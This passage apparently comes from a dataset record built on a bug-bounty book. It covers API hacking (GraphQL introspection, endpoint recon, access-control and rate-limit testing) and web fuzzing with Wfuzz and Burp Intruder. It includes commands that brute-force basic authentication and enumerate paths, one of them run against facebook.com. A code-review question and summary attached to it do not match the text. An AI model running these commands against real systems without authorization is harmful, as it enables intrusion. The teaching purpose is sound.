to ask a GraphQL system\nfor information about itself. In other words, they’re queries that return\ninformation about how to use the API. For example, __schema is a special\nfield that will return all the types available in the API; the following query\nwill return all the type names in the system. You can use it to find data\ntypes you can query for:\n{\n__schema {\ntypes {\nname\n}\n}\n}\n360 Chapter 24\nYou can also use the __type query to find the associated fields of a par-\nticular type:\n{\n__type(name: \"customer\") {\nname\nfields {\nname\n}\n}\n}\nYou will get the fields of a type returned like this. You can then use this\ninformation to query the API:\n{\n\"data\": {\n\"__type\": {\n\"name\": \"customer\",\n\"fields\": [\n{\n\"name\": \"id\",\n},\n{\n\"name\": \"firstName\",\n},\n{\n\"name\": \"lastName\",\n},\n{\n\"name\": \"email\",\n}\n]\n}\n}\n}\nIntrospection makes recon a breeze for the API hacker. To prevent\nmalicious attackers from enumerating their APIs, many organizations dis-\nable introspection in their GraphQL APIs.\nAPI-Centric Applications\nIncreasingly, APIs aren’t used as simply a mechanism to share data with out-\nside developers. You’ll also encounter API-centric applications, or applications\nbuilt using APIs. Instead of retrieving complete HTML documents from the\nserver, API-centric apps consist of a client-side component that requests and\nrenders data from the server by using API calls.\nFor example, when a user views Facebook posts, Facebook’s mobile\napplication uses API calls to retrieve data about the posts from the server\ninstead of retrieving entire HTML documents containing embedded data.\nThe application then renders that data on the client side to form web pages.\nAPI Hacking 361\nMany mobile applications are built this way. When a company already has\na web app, using an API-centric approach to build mobile apps saves time.\nAPIs allow developers to separate the app’s rendering and data-transporting\ntasks: developers can use API calls to transport data and then build a sepa-\nrate rendering mechanism for mobile, instead of reimplementing the same\nfunctionalities.\nYet the rise of API-centric applications means that companies and appli-\ncations expose more and more of their data and functionalities through\nAPIs. APIs often leak sensitive data and the application logic of the hosting\napplication. As you’ll see, this makes API bugs a widespread source of secu-\nrity breaches and a fruitful target for bug hunters.\nHunting for API Vulnerabilities\nLet’s explore some of the vulnerabilities that affect APIs and the steps you\ncan take to discover them. API vulnerabilities are similar to the ones that\naffect non-API web applications, so make sure you have a good understand-\ning of the bugs we’ve discussed up to this point. That said, when testing\nAPIs, you should focus your testing on the vulnerabilities listed in this sec-\ntion, because they are prevalent in API implementations.\nBefore we dive in, there are many open source API development and\ntesting tools that you can use to make the API testing process more effi-\ncient. Postman (https://www.postman.com/) is a handy tool that will help you\ntest APIs. You can use Postman to craft complex API requests from scratch\nand manage the large number of test requests that you will be sending.\nGraphQL Playground (https://github.com/graphql/graphql-playground/) is\nan IDE for crafting GraphQL queries that has autocompletion and error\nhighlighting.\nZAP has a GraphQL add-on (https://www.zaproxy.org/blog/2020-08-28\n-introducing-the-graphql-add-on-for-zap/) that automates GraphQL introspec-\ntion and test query generation. Clairvoyance (https://github.com/nikitastupin/\nclairvoyance/) helps you gain insight into a GraphQL API’s structure when\nintrospection is disabled.\nPerforming Recon\nFirst, hunting for API vulnerabilities is very much like hunting for vulnerabili-\nties in regular web applications in that it requires recon. The most difficult\naspect of API testing is knowing what the application expects and then tailor-\ning payloads to manipulate its functionality.\nIf you’re hacking a GraphQL API, you might start by sending introspec-\ntion queries to figure out the API’s structure. If you are testing a SOAP API,\nstart by looking for the WSDL file. If you’re attacking a REST or SOAP API,\nor if introspection is disabled on the GraphQL API you’re attacking, start by\nenumerating the API. API enumeration refers to the process of identifying as\nmany of the API’s endpoints as you can so you can test as many endpoints as\npossible.\n362 Chapter 24\nTo enumerate the API, start by reading the API’s public documentation\nif it has one. Companies with public APIs often publish detailed documenta-\ntion about the API’s endpoints and their parameters. You should be able to\nfind public API documentations by searching the internet for company_name\nAPI or company_name developer docs. This documentation provides a good\nstart for enumerating API endpoints, but don’t be fooled into thinking that\nthe official documentation contains all the endpoints you can test! APIs\noften have public and private endpoints, and only the public ones will be\nfound in these developer guides.\nTry using Swagger (https://swagger.io/), a toolkit developers use for\ndeveloping APIs. Swagger includes a tool for generating and maintaining\nAPI documentation that developers often use to document APIs internally.\nSometimes companies don’t publicly publish their API documentation but\nforget to lock down internal documentation hosted on Swagger. In this case,\nyou can find the documentation by searching the internet for company_name\ninurl:swagger. This documentation often includes all API endpoints, their\ninput parameters, and sample responses.\nThe next thing you can do is go through all the application workflows\nto capture API calls. You can do this by browsing the company’s applications\nwith an intercepting proxy recording HTTP traffic in the background. You\nmight find API calls used in the application’s workflow that aren’t in public\ndocumentation.\nUsing the endpoints you’ve found, you can try to deduce other end-\npoints. For instance, REST APIs often have a predictable structure, so you\ncan deduce new endpoints by studying existing ones. If both /posts/POST\n_ID/read and /posts/POST_ID/delete exist, is there an endpoint called /posts/\nPOST_ID/edit? Similarly, if you find blog posts located at /posts/1234 and\n/posts/1236, does /posts/1235 also exist?\nNext, search for other API endpoints by using recon techniques from\nChapter 5, such as studying JavaScript source code or the company’s public\nGitHub repositories. You can also try to generate error messages in hopes\nthat the API leaks information about itself. For example, try to provide\nunexpected data types or malformed JSON code to the API endpoints.\nFuzzing techniques can also help you find additional API endpoints by\nusing a wordlist. Many online wordlists are tailored for fuzzing API end-\npoints; one example wordlist is at https://gist.github.com/yassineaboukir/8e12a\ndefbd505ef704674ad6ad48743d/. We will talk more about how to fuzz an end-\npoint in Chapter 25.\nAlso note that APIs are often updated. While the application might\nnot actively use older versions of the API, these versions might still elicit\na response from the server. For every endpoint you find in a later version of\nthe API, you should test whether an older version of the endpoint works. For\nexample, if the /api/v2/user_emails/52603991338963203244 endpoint exists,\ndoes this one: /api/v1/user_emails/52603991338963203244? Older versions of\nan API often contain vulnerabilities that have been fixed in newer versions,\nso make sure to include finding older API endpoints in your recon strategy.\nAPI Hacking 363\nFinally, take the time to understand each API endpoint’s functionality,\nparameters, and query structure. The more you can learn about how an API\nworks, the more you’ll understand how to attack it. Identify all the possible\nuser data input locations for future testing. Look out for any authentication\nmechanisms, including these:\n• What access tokens are needed?\n• Which endpoints require tokens and which do not?\n• How are access tokens generated?\n• Can users use the API to generate a valid token without logging in?\n• Do access tokens expire when updating or resetting passwords?\nThroughout your recon process, make sure to take lots of notes.\nDocument the endpoints you find and their parameters.\nTesting for Broken Access Control and Info Leaks\nAfter recon, I like to start by testing for access-control issues and info leaks.\nMost APIs use access tokens to determine the rights of the client; they issue\naccess tokens to each API client, and clients use these to perform actions\nor retrieve data. If these API tokens aren’t properly issued and validated,\nattackers might bypass authentication and access data illegally.\nFor example, sometimes API tokens aren’t validated after the server\nreceives them. Other times, API tokens are not randomly generated and\ncan be predicted. Finally, some API tokens aren’t invalidated regularly, so\nattackers who’ve stolen tokens maintain access to the system indefinitely.\nAnother issue is broken resource or function-level access control.\nSometimes API endpoints don’t have the same access-control mechanisms as\nthe main application. For example, say a user with a valid API key can retrieve\ndata about themselves. Can they also read data about other users? Or can\nthey perform actions on another’s behalf through the API? Finally, can a\nregular user without admin privileges read data from endpoints restricted to\nadmins? Separately from REST or SOAP APIs, the GraphQL API of an appli-\ncation may have its own authorization mechanisms and configuration. This\nmeans that you can test for access-control issues on GraphQL endpoints even\nthough the web or REST API of an application is secure. These issues are\nsimilar to the IDOR vulnerabilities discussed in Chapter 10.\nOther times still, an API offers multiple ways to perform the same action,\nand access control isn’t implemented across all of them. For example, let’s say\nthat a REST API has two ways of deleting a blog post: sending a POST request\nto /posts/POST_ID/delete and sending a DELETE request to /posts/POST_ID.\nYou should ask yourself: are the two endpoints subject to the same access\ncontrols?\nAnother common API vulnerability is information leaks. API endpoints\noften return more information than they should, or than is needed to render\nthe web page. For example, I once found an API endpoint that populated a\nuser’s profile page. When I visited someone else’s profile page, an API call\nwas used to return the profile owner’s information. At first glance, the profile\n364 Chapter 24\npage didn’t leak any sensitive information, but the API response used to fetch\nthe user’s data actually returned the profile owner’s private API token as well!\nAfter an attacker steals the victim’s API token by visiting their profile page,\nthey could impersonate the victim by using this access token.\nMake a list of the endpoints that should be restricted by some form of\naccess control. For each of these endpoints, create two user accounts with\ndifferent levels of privilege: one that should have access to the functionality\nand one that shouldn’t. Test whether you can access the restricted function-\nality with the lower-privileged account.\nIf your lower-privileged user can’t access the restricted functionality, try\nremoving access tokens, or adding additional parameters like the cookie\nadmin=1 to the API call. You can also switch out the HTTP request methods,\nincluding GET, POST, PUT, PATCH, and DELETE, to see if access control\nis properly implemented across all methods. For example, if you can’t edit\nanother user’s blog posts via a POST request to an API endpoint, can you\nbypass the protection by using a PUT request instead?\nTry to view, modify, and delete other users’ info by switching out user\nIDs or other user identification parameters found in the API calls. If IDs\nused to identify users and resources are unpredictable, try to leak IDs\nthrough info leaks from other endpoints. For example, I once found an API\nendpoint that returned user information; it revealed the user’s ID as well as\nall of the user’s friends’ IDs. With the ID of both the user and their friend,\nI was able to access messages sent between the two users. By combining\ntwo info leaks and using just the user IDs, I was able to read a user’s private\nmessages!\nIn GraphQL, a common misconfiguration is allowing lower-privileged\nusers to modify a piece of data that they should not via a mutation request.\nTry to capture GraphQL queries allowed from one user’s account, and see\nif you can send the same query and achieve the same results from another\nwho shouldn’t have permission.\nWhile hunting for access control issues, closely study the data being sent\nback by the server. Don’t just look at the resulting HTML page; dive into the\nraw API response, as APIs often return data that doesn’t get displayed on the\nweb page. You might be able to find sensitive information disclosures in the\nresponse body. Is the API endpoint returning any private user information,\nor sensitive information about the organization? Should the returned infor-\nmation be available to the current user? Does the returned information pose\na security risk to the company?\nTesting for Rate-Limiting Issues\nAPIs often lack rate limiting; in other words, the API server doesn’t restrict\nthe number of requests a client or user account can send within a short\ntime frame. A lack of rate limiting in itself is a low-severity vulnerability\nunless it’s proven to be exploitable by attackers. But on critical endpoints,\na lack of rate limiting means that malicious users can send large numbers\nof requests to the server to harvest database information or brute-force\ncredentials.\nAPI Hacking 365\nEndpoints that can be dangerous when not rate limited include authen-\ntication endpoints, endpoints not protected by access control, and endpoints\nthat return large amounts of sensitive data. For example, I once encountered\nan API endpoint that allows users to retrieve their emails via an email ID,\nlike this:\nGET /api/v2/user_emails/52603991338963203244\nThis endpoint isn’t protected by any access control. Since this endpoint\nisn’t rate limited, either, an attacker can essentially guess the email ID field\nby sending numerous requests. Once they’ve guessed a valid ID, they can\naccess another user’s private email.\nTo test for rate-limiting issues, make large numbers of requests to the\nendpoint. You can use the Burp intruder or curl to send 100 to 200 requests\nin a short time. Make sure you repeat the test in different authentication\nstages, because users with different privilege levels can be subject to differ-\nent rate limits.\nBe really careful when you are testing for rate-limiting issues because\nit’s very possible to accidentally launch a DoS attack on the app by drowning\nit with requests. You should obtain written permission before conducting\nrate-limiting tests and time-throttle your requests according to the com-\npany’s policies.\nAlso keep in mind that applications could have rate limits that are higher\nthan your testing tools’ capabilities. For instance, applications could set a rate\nlimit of 400 requests a second, and your tooling may not be capable of reach-\ning that limit.\nTesting for Technical Bugs\nMany of the bugs that we’ve discussed in this book so far—such as SQL injec-\ntion, deserialization issues, XXEs, template injections, SSRF, and RCEs—are\ncaused by improper input validation. Sometimes developers forget to imple-\nment proper input validation mechanisms for APIs.\nAPIs are therefore susceptible to many of the other vulnerabilities that\naffect regular web applications too. Since APIs are another way applications\naccept user input, they become another way for attackers to smuggle mali-\ncious input into the application’s workflow.\nIf an API endpoint can access external URLs, it might be vulnerable to\nSSRF, so you should check whether its access to internal URLs isn’t restricted.\nRace conditions can also happen within APIs. If you can use API endpoints\nto access application features affected by race conditions, these endpoints\ncan become an alternative way to trigger the race condition.\nOther vulnerabilities, like path traversal, file inclusion, insecure deseri-\nalization issues, XXE, and XSS can also happen. If an API endpoint returns\ninternal resources via a filepath, attackers might use that endpoint to read\nsensitive files stored on the server. If an API endpoint used for file uploads\n366 Chapter 24\ndoesn’t limit the data type that users can upload, attackers might upload\nmalicious files, such as web shells or other malware, to the server. APIs also\ncommonly accept user input in serialized formats such as XML. In this\ncase, insecure deserialization or XXEs can happen. RCEs via file upload or\nXXEs are commonly seen in API endpoints. Finally, if an API’s URL param-\neters are reflected in the response, attackers can use that API endpoint to\ntrigger reflected XSS on victims’ browsers.\nThe process of testing for these issues will be similar to testing for them\nin a regular web app. You’ll simply supply the payloads to the application in\nAPI form.\nFor example, for vulnerabilities like path traversals and file-inclusion\nattacks, look out for absolute and relative filepaths in API endpoints and try\nto mess with the path parameters. If an API endpoint accepts XML input,\ntry to insert an XXE payload into the request. And if the endpoint’s URL\nparameters are reflected in the response, see if you can trigger a reflected\nXSS by placing a payload in the URL.\nYou can also utilize fuzz-testing techniques, which we’ll discuss in\nChapter 25, to find these vulnerabilities.\nApplications are becoming increasingly reliant on APIs, even as APIs\naren’t always as well protected as their web application counterparts. Pay\nattention to the APIs used by your targets, and you might find issues not\npresent in the main application. If you are interested in learning more\nabout hacking APIs and web applications in general, the OWASP Web\nSecurity Testing Guide (https://github.com/OWASP/wstg/) is a great resource\nto learn from.\nAPI Hacking 367",
    "question": "What are the key strategies for conducting effective source code reviews to identify vulnerabilities in applications?",
    "summary": "Code reviews are essential for identifying vulnerabilities in applications by analyzing source code directly. They help find issues like insecure deserialization, hardcoded secrets, and weak encryption, and provide insights into how to program safely. Code reviews can be done quickly using tools like grep to find dangerous functions, or more thoroughly by examining code in detail. Understanding the code structure and developer comments is key to spotting hidden bugs and weaknesses. \n\nWhen reviewing code, focus on functions that handle user input, such as authentication and authorization mechanisms, as these are common points of vulnerability. Look for insecure practices like using eval() or unsafe deserialization methods, and check for hardcoded credentials. Additionally, review the application's dependencies and ensure they are up-to-date to avoid known vulnerabilities. \n\nBy learning to conduct code reviews, you can become a better hacker, as it enhances your understanding of secure coding practices and helps you find vulnerabilities more efficiently. This skill is particularly useful when dealing with open-source components or when you have access to the source code, allowing you to test in a more controlled and effective manner."
  },
  {
    "start": 254,
    "end": 262,
    "text": "25\nAUTOMATIC VULNER ABILIT Y\nDISCOVERY USING FUZZERS\nWhenever I approach a new target, I prefer\nto search for bugs manually. Manual testing\nis great for discovering new and unexpected\nattack vectors. It can also help you learn new\nsecurity concepts in depth. But manual testing also\ntakes a lot of time and effort, so as with automating\nreconnaissance, you should strive to automate at least\npart of the process of finding bugs. Automated testing\ncan help you tease out a large number of bugs within\na short time frame.\nIn fact, the best-performing bug bounty hunters automate most of\ntheir hacking process. They automate their recon, and write programs that\nconstantly look for vulnerabilities on the targets of their choice. Whenever\ntheir tools notify them of a potential vulnerability, they immediately verify\nand report it.\nBugs discovered through an automation technique called fuzzing, or\nfuzz testing, now account for a majority of new CVE entries. While often asso-\nciated with the development of binary exploits, fuzzing can also be used for\ndiscovering vulnerabilities in web applications. In this chapter, we’ll talk\na bit about fuzzing web applications by using two tools, Burp intruder and\nWfuzz, and about what it can help you achieve.\nWhat Is Fuzzing?\nFuzzing is the process of sending a wide range of invalid and unexpected data\nto an application and monitoring the application for exceptions. Sometimes\nhackers craft this invalid data for a specific purpose; other times, they gener-\nate it randomly or by using algorithms. In both cases, the goal is to induce\nunexpected behavior, like crashes, and then check if the error leads to an\nexploitable bug. Fuzzing is particularly useful for exposing bugs like memory\nleaks, control flow issues, and race conditions. For example, you can fuzz\ncompiled binaries for vulnerabilities by using tools like the American Fuzzy\nLop, or AFL (https://github.com/google/AFL/).\nThere are many kinds of fuzzing, each optimized for testing a specific\ntype of issue in an application. Web application fuzzing is a technique that\nattempts to expose common web vulnerabilities, like injection issues, XSS,\nand authentication bypass.\nHow a Web Fuzzer Works\nWeb fuzzers automatically generate malicious requests by inserting the pay-\nloads of common vulnerabilities into web application injection points. They\nthen fire off these requests and keep track of the server’s responses.\nTo better understand this process, let’s take a look at how the open\nsource web application fuzzer Wfuzz (https://github.com/xmendez/wfuzz/)\nworks. When provided with a wordlist and an endpoint, Wfuzz replaces all\nlocations marked FUZZ with strings from the wordlist. For example, the fol-\nlowing Wfuzz command will replace the instance of FUZZ inside the URL\nwith every string in the common_paths.txt wordlist:\n$ wfuzz -w common_paths.txt http://example.com/FUZZ\nYou should provide a different wordlist for each type of vulnerability\nyou scan for. For instance, you can make the fuzzer behave like a directory\nenumerator by supplying it with a wordlist of common filepaths. As a result,\nWfuzz will generate requests that enumerate the paths on example.com:\nhttp://example.com/admin\nhttp://example.com/admin.php\nhttp://example.com/cgi-bin\nhttp://example.com/secure\nhttp://example.com/authorize.php\nhttp://example.com/cron.php\nhttp://example.com/administrator\n370 Chapter 25\nYou can also make the fuzzer act like an IDOR scanner by providing it\nwith potential ID values:\n$ wfuzz -w ids.txt http://example.com/view_inbox?user_id=FUZZ\nSay that ids.txt is a list of numeric IDs. If example.com/view_inbox is the\nendpoint used to access different users’ email inboxes, this command will\ncause Wfuzz to generate a series of requests that try to access other users’\ninboxes, such as the following:\nhttp://example.com/view_inbox?user_id=1\nhttp://example.com/view_inbox?user_id=2\nhttp://example.com/view_inbox?user_id=3\nOnce you receive the server’s responses, you can analyze them to see\nif there really is a file in that particular path, or if you can access the email\ninbox of another user. As you can see, unlike vulnerability scanners, fuzzers\nare quite flexible in the vulnerabilities they test for. You can customize them\nto their fullest extent by specifying different payloads and injection points.\nThe Fuzzing Process\nNow let’s go through the steps that you can take to integrate fuzzing into\nyour hacking process! When you approach a target, how do you start fuzz-\ning it? The process of fuzzing an application can be broken into four steps.\nYou can start by determining the endpoints you can fuzz within an applica-\ntion. Then, decide on the payload list and start fuzzing. Finally, monitor the\nresults of your fuzzer and look for anomalies.\nStep 1: Determine the Data Injection Points\nThe first thing to do when fuzzing a web application is to identify the ways a\nuser can provide input to the application. What are the endpoints that take\nuser input? What are the parameters used? What headers does the applica-\ntion use? You can think of these parameters and headers as data injection\npoints or data entry points, since these are the locations at which an attacker\ncan inject data into an application.\nBy now, you should already have an intuition of which vulnerabilities you\nshould look for on various user input opportunities. For example, when you\nsee a numeric ID, you should test for IDOR, and when you see a search bar,\nyou should test for reflected XSS. Classify the data injection points you’ve\nfound on the target according to the vulnerabilities they are prone to:\nData entry points to test for IDORs\nGET /email_inbox?user_id=FUZZ\nHost: example.com\nAutomatic Vulnerability Discovery Using Fuzzers 371\nPOST /delete_user\nHost: example.com\n(POST request parameter)\nuser_id=FUZZ\nData entry points to test for XSS\nGET /search?q=FUZZ\nHost: example.com\nPOST /send_email\nHost: example.com\n(POST request parameter)\nuser_id=abc&title=FUZZ&body=FUZZ\nStep 2: Decide on the Payload List\nAfter you’ve identified the data injection points and the vulnerabilities that\nyou might be able to exploit with each one, determine what data to feed to\neach injection point. You should fuzz each injection point with common\npayloads of the most likely vulnerabilities. Feeding XSS payloads and SQL\ninjection payloads into most data entry points is also worthwhile.\nUsing a good payload list is essential to finding vulnerabilities with fuzz-\ners. I recommend downloading SecLists by Daniel Miessler (https://github.com/\ndanielmiessler/SecLists/) and Big List of Naughty Strings by Max Woolf\n(https://github.com/minimaxir/big-list-of-naughty-strings/) for a pretty comprehen-\nsive payload list useful for fuzzing web applications. Among other features,\nthese lists include payloads for the most common web vulnerabilities, such\nas XXS, SQL injection, and XXE. Another good wordlist database for\nboth enumeration and vulnerability fuzzing is FuzzDB (https://github.com/\nfuzzdb-project/fuzzdb/).\nBesides using known payloads, you might try generating payloads ran-\ndomly. In particular, create extremely long payloads, payloads that contain\nodd characters of various encodings, and payloads that contain certain\nspecial characters, like the newline character, the line-feed character, and\nmore. By feeding the application garbage data like this, you might be able\nto detect unexpected behavior and discover new classes of vulnerabilities!\nYou can use bash scripts, which you learned about in Chapter 5, to auto-\nmate the generation of random payloads. How would you generate a string\nof a random length that includes specific special characters? Hint: you can\nuse a for loop or the file /dev/random on Unix systems.\nStep 3: Fuzz\nNext, systematically feed your payload list to the data entry points of the\napplication. There are several ways of doing this, depending on your needs\nand programming skills. The simplest way to automate fuzzing is to use the\nBurp intruder (Figure 25-1). The intruder offers a fuzzer with a graphical\n372 Chapter 25\nuser interface (GUI) that seamlessly integrates with your Burp proxy.\nWhenever you encounter a request you’d like to fuzz, you can right-click it\nand choose Send to Intruder.\nIn the Intruder tab, you can configure your fuzzer settings, select your\ndata injection points and payload list, and start fuzzing. To add a part of the\nrequest as a data injection point, highlight the portion of the request and\nclick Add on the right side of the window.\nFigure 25-1: The Burp intruder payload position selection\nThen either select a predefined list of payloads or generate payload lists\nin the Payloads tab (Figure 25-2). For example, you could generate list of\nnumbers or randomly generated alphanumeric strings.\nFigure 25-2: Selecting the payload list in Burp intruder\nBurp intruder is easy to use, but it has a downside: the free version of\nBurp limits the fuzzer’s functionality, and time-throttles its attacks, mean-\ning that it slows your fuzzing and limits the number of requests you can\nsend over a certain period of time. You’ll be able to send only a certain\nnumber of requests per minute, making the intruder a lot less efficient than\na non-time-throttled fuzzer. Unless you need a GUI or have the professional\nAutomatic Vulnerability Discovery Using Fuzzers 373\nversion of Burp, you’re better off using an open source fuzzer like OWASP\nZAP’s fuzzer or Wfuzz. You’ll learn how to fuzz a target with Wfuzz in\n“Fuzzing with Wfuzz” later on this page.\nNote that sometimes throttling your fuzzers will be necessary to pre-\nvent disruption to the application’s operations. This shouldn’t be an issue\nfor bigger companies, but you could accidentally launch a DoS attack on\nsmaller companies without scaling architectures if you fuzz their applica-\ntions without time throttling. Always use caution and obtain permission\nfrom the company when conducting fuzz testing!\nStep 4: Monitor the Results\nAnalyze the results your fuzzer returned, looking for patterns and anoma-\nlies in the server responses. What to look for depends on the payload set\nyou used and the vulnerability you’re hoping to find. For example, when\nyou’re using a fuzzer to find filepaths, status codes are a good indicator of\nwhether a file is present. If the returned status code for a pathname is in\nthe 200 range, you might have discovered a valid path. If the status code is\n404, on the other hand, the filepath probably isn’t valid.\nWhen fuzzing for SQL injection, you might want to look for a change\nin response content length or time. If the returned content for a certain\npayload is longer than that of other payloads, it might indicate that your\npayload was able to influence the database’s operation and change what it\nreturned. On the other hand, if you’re using a payload list that induces time\ndelays in an application, check whether any of the payloads make the server\nrespond more slowly than average. Use the knowledge you learned in this\nbook to identify key indicators that a vulnerability is present.\nFuzzing with Wfuzz\nNow that you understand the general approach to take, let’s walk through\na hands-on example using Wfuzz, which you can install by using this\ncommand:\n$ pip install wfuzz\nFuzzing is useful in both the recon phase and the hunting phase: you\ncan use fuzzing to enumerate filepaths, brute-force authentication, test for\ncommon web vulnerabilities, and more.\nPath Enumeration\nDuring the recon stage, try using Wfuzz to enumerate filepaths on a server.\nHere’s a command you can use to enumerate filepaths on example.com:\n$ wfuzz -w wordlist.txt -f output.txt --hc 404 --follow http://example.com/FUZZ\n374 Chapter 25\nThe -w flag option specifies the wordlist to use for enumeration. In this\ncase, you should pick a good path enumeration wordlist designed for the\ntechnology used by your target. The -f flag specifies the output file loca-\ntion. Here, we store our results into a file named output.txt in the current\ndirectory. The --hc 404 option tells Wfuzz to exclude any response that has\na 404 status code. Remember that this code stands for File Not Found. With\nthis filter, we can easily drop URLs that don’t point to a valid file or direc-\ntory from the results list. The --follow flag tells Wfuzz to follow all HTTP\nredirections so that our result shows the URL’s actual destination.\nLet’s run the command using a simple wordlist to see what we can find\non facebook.com. For our purposes, let’s use a wordlist comprising just four\nwords, called wordlist.txt:\nauthorize.php\ncron.php\nadministrator\nsecure\nRun this command to enumerate paths on Facebook:\n$ wfuzz -w wordlist.txt -f output.txt --hc 404 --follow http://facebook.com/FUZZ\nLet’s take a look at the results. From left to right, a Wfuzz report has\nthe following columns for each request: Request ID, HTTP Response Code,\nResponse Length in Lines, Response Length in Words, Response Length in\nCharacters, and the Payload Used:\n********************************************************\n* Wfuzz 2.4.6 - The Web Fuzzer *\n********************************************************\nTarget: http://facebook.com/FUZZ\nTotal requests: 4\n===================================================================\nID Response Lines Word Chars Payload\n===================================================================\n000000004: 200 20 L 2904 W 227381 Ch \"secure\"\nTotal time: 1.080132\nProcessed Requests: 4\nFiltered Requests: 3\nRequests/sec.: 3.703250\nYou can see that these results contain only one response. This is because\nwe filtered out irrelevant results. Since we dropped all 404 responses, we\ncan now focus on the URLs that point to actual paths. It looks like /secure\nreturned a 200 OK status code and is a valid path on facebook.com.\nAutomatic Vulnerability Discovery Using Fuzzers 375\nBrute-Forcing Authentication\nOnce you’ve gathered valid filepaths on the target, you might find that\nsome of the pages on the server are protected. Most of the time, these pages\nwill have a 403 Forbidden response code. What can you do then?\nWell, you could try to brute-force the authentication on the page. For\nexample, sometimes pages use HTTP’s basic authentication scheme as\naccess control. In this case, you can use Wfuzz to fuzz the authentication\nheaders, using the -H flag to specify custom headers:\n$ wfuzz -w wordlist.txt -H \"Authorization: Basic FUZZ\" http://example.com/admin\nThe basic authentication scheme uses a header named Authorization to\ntransfer credentials that are the base64-encoded strings of username and\npassword pairs. For example, if your username and password were admin and\npassword, your authentication string would be base64(\"admin:password\"), or\nYWRtaW46cGFzc3dvcmQ=. You could generate authentication strings from com-\nmon username and password pairs by using a script, then feed them to your\ntarget’s protected pages by using Wfuzz.\nAnother way to brute-force basic authentication is to use Wfuzz’s --basic\noption. This option automatically constructs authentication strings to\nbrute-force basic authentication, given an input list of usernames and pass-\nwords. In Wfuzz, you can mark different injection points with FUZZ, FUZ2Z,\nFUZ3Z, and so on. These injection points will be fuzzed with the first, second,\nand third wordlist passed in, respectively. Here’s a command you can use to\nfuzz the username and password field at the same time:\n$ wfuzz -w usernames.txt -w passwords.txt --basic FUZZ:FUZ2Z http://example.com/admin\nThe usernames.txt file contains two usernames: admin and administrator.\nThe passwords.txt file contains three passwords: secret, pass, and password. As\nyou can see, Wfuzz sends a request for each username and password combi-\nnation from your lists:\n********************************************************\n* Wfuzz 2.4.6 - The Web Fuzzer *\n********************************************************\nTarget: http://example.com/admin\nTotal requests: 6\n===================================================================\nID Response Lines Word Chars Payload\n===================================================================\n000000002: 404 46 L 120 W 1256 Ch \"admin – pass\"\n000000001: 404 46 L 120 W 1256 Ch \"admin – secret\"\n000000003: 404 46 L 120 W 1256 Ch \"admin – password\"\n000000006: 404 46 L 120 W 1256 Ch \"administrator – password\"\n376 Chapter 25\n000000004: 404 46 L 120 W 1256 Ch \"administrator – secret\"\n000000005: 404 46 L 120 W 1256 Ch \"administrator – pass\"\nTotal time: 0.153867\nProcessed Requests: 6\nFiltered Requests: 0\nRequests/sec.: 38.99447\nOther ways to bypass authentication by using brute-forcing include\nswitching out the User-Agent header or forging custom headers used for\nauthentication. You could accomplish all of these by using Wfuzz to brute-\nforce HTTP request headers.\nTesting for Common Web Vulnerabilities\nFinally, Wfuzz can help you automatically test for common web vulnerabili-\nties. First of all, you can use Wfuzz to fuzz URL parameters and test for vul-\nnerabilities like IDOR and open redirects. Fuzz URL parameters by placing\na FUZZ keyword in the URL. For example, if a site uses a numeric ID for chat\nmessages, test various IDs by using this command:\n$ wfuzz -w wordlist.txt http://example.com/view_message?message_id=FUZZ\nThen find valid IDs by examining the response codes or content length\nof the response and see if you can access the messages of others. The IDs that\npoint to valid pages usually return a 200 response code or a longer web page.\nYou can also insert payloads into redirect parameters to test for an open\nredirect:\n$ wfuzz -w wordlist.txt http://example.com?redirect=FUZZ\nTo check if a payload causes a redirect, turn on Wfuzz’s follow (--follow)\nand verbose (-v) options. The follow option instructs Wfuzz to follow redi-\nrects. The verbose option shows more detailed results, including whether\nredirects occurred during the request. See if you can construct a payload\nthat redirects users to your site:\n$ wfuzz -w wordlist.txt -v –-follow http://example.com?redirect=FUZZ\nFinally, test for vulnerabilities such as XSS and SQL injection by fuzzing\nURL parameters, POST parameters, or other user input locations with com-\nmon payload lists.\nWhen testing for XSS by using Wfuzz, try creating a list of scripts that\nredirect the user to your page, and then turn on the verbose option to\nmonitor for any redirects. Alternatively, you can use Wfuzz content filters to\ncheck for XSS payloads reflected. The --filter flag lets you set a result filter.\nAn especially useful filter is content~STRING, which returns responses that\ncontain whatever STRING is:\n$ wfuzz -w xss.txt --filter \"content~FUZZ\" http://example.com/get_user?user_id=FUZZ\nAutomatic Vulnerability Discovery Using Fuzzers 377\nFor SQL injection vulnerabilities, try using a premade SQL injection\nwordlist and monitor for anomalies in the response time, response code,\nor response length of each payload. If you use SQL injection payloads that\ninclude time delays, look for long response times. If most payloads return a\ncertain response code but one does not, investigate that response further to\nsee if there’s a SQL injection there. A longer response length might also be\nan indication that you were able to extract data from the database.\nThe following command tests for SQL injection using the wordlist sqli.txt.\nYou can specify POST body data with the -d flag:\n$ wfuzz -w sqli.txt -d \"user_id=FUZZ\" http://example.com/get_user\nMore About Wfuzz\nWfuzz has many more advanced options, filters, and customizations that you\ncan take advantage of. Used to its full potential, Wfuzz can automate the\nmost tedious parts of your workflow and help you find more bugs. For more\ncool Wfuzz tricks, read its documentation at https://wfuzz.readthedocs.io/.\nFuzzing vs. Static Analysis\nIn Chapter 22, I discussed the effectiveness of source code review for dis-\ncovering web vulnerabilities. You might now be wondering: why not just\nperform a static analysis of the code? Why conduct fuzz testing at all?\nStatic code analysis is an invaluable tool for identifying bugs and improper\nprogramming practices that attackers can exploit. However, static analysis has\nits limitations.\nFirst, it evaluates an application in a non-live state. Performing code\nreview on an application won’t let you simulate how the application will\nreact when it’s running live and clients are interacting with it, and it’s very\ndifficult to predict all the possible malicious inputs an attacker can provide.\nStatic code analysis also requires access to the application’s source code.\nWhen you’re doing a black-box test, as in a bug bounty scenario, you probably\nwon’t be able to obtain the source code unless you can leak the application’s\nsource code or identify the open source components the application is using.\nThis makes fuzzing a great way of adding to your testing methodology, since\nyou won’t need the source code to fuzz an application.\nPitfalls of Fuzzing\nOf course, fuzzing isn’t a magic cure-all solution for all bug detection. This\ntechnique has certain limitations, one of which is rate-limiting by the server.\nDuring a remote, black-box engagement, you might not be able to send in\nlarge numbers of payloads to the application without the server detecting\nyour activity, or you hitting some kind of rate limit. This can cause your test-\ning to slow down or the server might ban you from the service.\n378 Chapter 25\nIn a black-box test, it can also be difficult to accurately evaluate the\nimpact of the bug found through fuzzing, since you don’t have access to the\ncode and so are getting a limited sample of the application’s behavior. You’ll\noften need to conduct further manual testing to classify the bug’s validity\nand significance. Think of fuzzing as a metal detector: it merely points you\nto the suspicious spots. In the end, you need to inspect more closely to see if\nyou have found something of value.\nAnother limitation involves the 